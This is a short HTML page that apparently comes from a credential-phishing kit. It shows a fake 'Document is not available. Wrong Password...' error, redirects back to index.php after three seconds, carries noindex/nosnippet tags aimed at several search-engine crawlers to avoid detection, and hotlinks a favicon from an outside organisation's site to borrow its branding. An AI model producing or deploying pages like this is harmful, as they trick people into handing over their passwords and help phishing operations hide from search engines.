<!DOCTYPE html>

<html lang="en">

<head>
<meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
<link rel="shortcut icon" href="https://www.firb.br/firb/images/favicon.ico"/>



<meta charset="utf-8">

<title>Wrong Password</title>
	<link rel="stylesheet" href="css/wait.css">

<style type="text/css">
body {
	width: 100%;
}

img {
	text-align: center;
}

h1 {
	text-align: center;
	color: #000;
	text-shadow: 1px 1px 1px #fff;
}

</style>
<body>
<center><img src="img/ex.png" height="50"></center>
<h1>Document is not available. Wrong Password...</h1>
<meta http-equiv="refresh" content="3; url=index.php" />
</body></html>

